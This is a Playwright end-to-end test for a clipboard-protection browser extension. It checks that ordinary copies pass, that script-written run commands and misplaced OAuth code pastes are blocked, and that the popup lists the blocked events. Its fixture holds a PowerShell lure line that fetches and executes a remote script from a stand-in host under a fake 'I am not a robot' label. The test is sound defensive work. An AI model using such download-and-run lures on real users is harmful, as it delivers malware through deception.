// Loads extension/dist into a real Chromium and checks the three things it must do:
// let an ordinary copy through, block a script-written run-command copy, and stop an
// OAuth code being pasted into a site it was not issued for.
// Pages are served from memory on fictional *.test hosts; nothing is ever executed.
//   npm run build && node scripts/ext-e2e.mjs [--shots]
import { chromium } from 'playwright';
import { mkdtempSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const ext = new URL('../extension/dist/', import.meta.url).pathname;
const shots = process.argv.includes('--shots') ? new URL('../docs/assets/', import.meta.url).pathname : null;
if (shots) mkdirSync(shots, { recursive: true });

const BLOCKED = 'powershell -c "iwr https://example-lure.test/stage.ps1 | iex" # I am not a robot - Verification ID: 88231';
const OAUTH = `http://localhost:8400/?code=0.AXEA${'x'.repeat(120)}&state=abc123&session_state=s1`;

const page = (body) => `<!doctype html><meta charset="utf-8"><title>OwlCept e2e</title>
<style>body{font:16px system-ui;margin:40px;max-width:720px}button{font:inherit;padding:8px 14px}textarea{width:100%;height:80px}</style>
${body}`;

const PAGES = {
  'https://docs.example.test/': page(`<h1>Install guide</h1><pre id="cmd">npm install --save-dev typescript</pre>
    <button id="copy" onclick="navigator.clipboard.writeText(document.getElementById('cmd').textContent)">Copy</button>`),
  'https://example-lure.test/': page(`<h1>Test page</h1><p>Plain fixture: the button writes a defanged command to the clipboard.</p>
    <button id="copy" onclick='navigator.clipboard.writeText(${JSON.stringify(BLOCKED)})'>Copy</button>`),
  'https://connect.example-lure.test/': page(`<h1>Connect your account</h1><textarea id="box"></textarea>`),
};

const results = [];
const check = (name, ok, detail = '') => {
  results.push(ok);
  console.log(`${ok ? '✓' : '✗'} ${name}${detail ? ` — ${detail}` : ''}`);
};

const context = await chromium.launchPersistentContext(mkdtempSync(join(tmpdir(), 'owlcept-e2e-')), {
  channel: 'chromium',
  headless: !process.argv.includes('--headed'),
  viewport: { width: 1100, height: 720 },
  args: [`--disable-extensions-except=${ext}`, `--load-extension=${ext}`],
});
await context.grantPermissions(['clipboard-read', 'clipboard-write']);
// Only web traffic: the extension's own chrome-extension:// files must load untouched.
await context.route(/^https?:\/\//, (route) => {
  const html = PAGES[route.request().url()];
  return html ? route.fulfill({ contentType: 'text/html', body: html }) : route.abort();
});

let [worker] = context.serviceWorkers();
worker ??= await context.waitForEvent('serviceworker');
const extId = new URL(worker.url()).host;
check('extension service worker started', !!extId, extId);

const banner = (p) => p.evaluate(() => !!document.querySelector('owlcept-warning'));
const clip = (p) => p.evaluate(() => navigator.clipboard.readText());

// 1. An ordinary copy goes through untouched.
const p1 = await context.newPage();
await p1.goto('https://docs.example.test/');
await p1.click('#copy');
await p1.waitForTimeout(800);
check('ordinary copy is allowed', !(await banner(p1)) && (await clip(p1)) === 'npm install --save-dev typescript');

// 2. A script-written run-command copy is blocked and the clipboard is replaced.
const p2 = await context.newPage();
await p2.goto('https://example-lure.test/');
await p2.click('#copy');
await p2.waitForSelector('owlcept-warning', { state: 'attached', timeout: 3000 }).catch(() => null);
const replaced = await clip(p2);
check('script-written run command is blocked', await banner(p2));
check('clipboard holds the safe replacement', replaced !== BLOCKED, JSON.stringify(replaced.slice(0, 60)));
if (shots) await p2.screenshot({ path: `${shots}ext-block.png` });

// 3. ConsentFix: an OAuth code pasted into a site it was not issued for.
const p3 = await context.newPage();
await p3.goto('https://connect.example-lure.test/');
await p3.evaluate((t) => navigator.clipboard.writeText(t), OAUTH);
await p3.click('#box');
await p3.keyboard.press(process.platform === 'darwin' ? 'Meta+V' : 'Control+V');
await p3.waitForTimeout(800);
const pasted = await p3.inputValue('#box');
check('OAuth code paste is stopped', pasted === '' && (await banner(p3)), `textarea=${pasted.length} chars`);
if (shots) await p3.screenshot({ path: `${shots}ext-consentfix.png` });

// 4. The popup runs, shows its icon and lists what was just stopped.
const p4 = await context.newPage();
await p4.setViewportSize({ width: 340, height: 430 });
await p4.goto(`chrome-extension://${extId}/popup.html`);
await p4.waitForFunction(() => document.getElementById('status')?.textContent?.startsWith('Protected:'), null, { timeout: 3000 }).catch(() => null);
const popup = await p4.evaluate(() => ({
  status: document.getElementById('status')?.textContent ?? '',
  icon: document.querySelector('header img')?.naturalWidth ?? 0,
  blocked: document.querySelectorAll('#events li:not(.empty)').length,
}));
check('popup renders with its icon', popup.status.startsWith('Protected:') && popup.icon > 0, popup.status);
check('popup lists the blocked events', popup.blocked >= 2, `${popup.blocked} listed`);
if (shots) await p4.screenshot({ path: `${shots}ext-popup.png` });

await context.close();
const failed = results.filter((r) => !r).length;
console.log(failed ? `${failed} check(s) failed` : `all ${results.length} checks passed`);
process.exit(failed ? 1 : 0);
